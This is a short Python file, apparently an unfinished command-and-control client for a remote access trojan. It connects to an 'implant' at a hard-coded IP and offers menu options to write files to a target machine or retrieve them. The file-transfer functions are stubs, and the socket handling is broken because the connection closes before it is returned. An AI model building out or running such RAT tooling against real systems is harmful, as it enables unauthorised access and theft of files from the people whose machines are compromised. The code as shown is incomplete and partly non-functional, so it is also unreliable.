# Patrick Sacchet
# Version 1.0
# Serves as the main CMD client interface which will provide tasking to our RAT on target

import socket

EXIT = 0
PORT_NUM = 1550
HOST = "192.168.111.128"

def commandSend(commandType):
    return 1


def openSock():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((HOST, PORT_NUM))
        #   sock.sendall(b'Hello, world')
            #data = s.recv(1024)
            return sock
    except Exception as e:
        print("ERROR: Could not connect to implant: ", e)
        return -1
    return

def printHelp():
    print("""Please select from the following options: \n
            1) Write a file to a location on target \n
            2) Get a file from a specific location on target\n
            0) Exit""")
    return 1

def testSend(sock, bytes):
    sock.send(bytes.encode())
    data = sock.recv(1024)
    #sock.close()
    return data

def main():
    print ("Attmepting to connect to target")
    sock = openSock()
    if (sock == -1):
        print ("Failed to open socket; exiting....")
        return 0
    print ("Attempting to reach out to implant....")
    data = 'test message'
    response = testSend(sock, data)
    #if (not testSend()):
    if (len(response) == 0):
        print ("Failed to get response from implant; exiting...")
    # Now wait for user input and make appropiate call
    userInput = 1
    while (int(userInput) != EXIT):
        printHelp()
        userInput = input("> ")
    return 1


if __name__ == '__main__':
    main()
